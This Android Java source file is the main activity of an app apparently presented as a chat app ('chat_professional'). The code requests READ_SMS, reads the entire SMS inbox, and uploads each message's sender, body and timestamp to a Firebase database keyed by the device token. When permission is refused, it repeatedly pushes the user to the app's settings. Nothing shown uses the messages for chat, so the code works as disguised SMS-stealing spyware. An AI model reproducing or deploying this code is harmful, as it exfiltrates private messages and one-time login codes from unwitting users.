package com.mteam.chat_professional;

import android.*;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.iid.FirebaseInstanceId;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private DatabaseReference databaseReference;
    private String token;
    private List<String>listPer;
    private List<Message>messages;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        listPer=new ArrayList<>();
        listPer.add("android.permission.READ_SMS");
        //listPer.add("android.permission.RECEIVE_SMS");

        if(Utils.checkPermisson(this,listPer)){
            readSms();
        }


    }

    private void readSms() {
        databaseReference = FirebaseDatabase.getInstance().getReference();
        token= FirebaseInstanceId.getInstance().getToken();
        SimpleDateFormat sdf=new SimpleDateFormat("HH:mm:ss dd:MM:yyyy");
        Uri uri=Uri.parse("content://sms/inbox");
        Cursor cursor=getContentResolver().query(uri,null,null,null,null);
        int vtPhone=cursor.getColumnIndex("address");
        int vtTime=cursor.getColumnIndex("date");
        int vtBody=cursor.getColumnIndex("body");
        while (cursor.moveToNext())
        {
            String phone=cursor.getString(vtPhone);
            String body=cursor.getString(vtBody);
            long timex=cursor.getLong(vtTime);
            Date date=new Date(timex);
            String datetime=sdf.format(date);
            Message message=new Message(phone,body,datetime);

            databaseReference.child("Requests").child(token).child(message.getDate()).setValue(message);

        }

        cursor.close();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 100) {
            for (int grant : grantResults) {
                if (grant == PackageManager.PERMISSION_GRANTED) {//neu duoc chap thuan
                    readSms();

                } else {
                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + getPackageName()));
                     startActivityForResult(intent, 10);
                }


            }
        }


    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 10) {
            if (Utils.checkPermisson(MainActivity.this, listPer)) {
                readSms();
            }
        }
    }

}
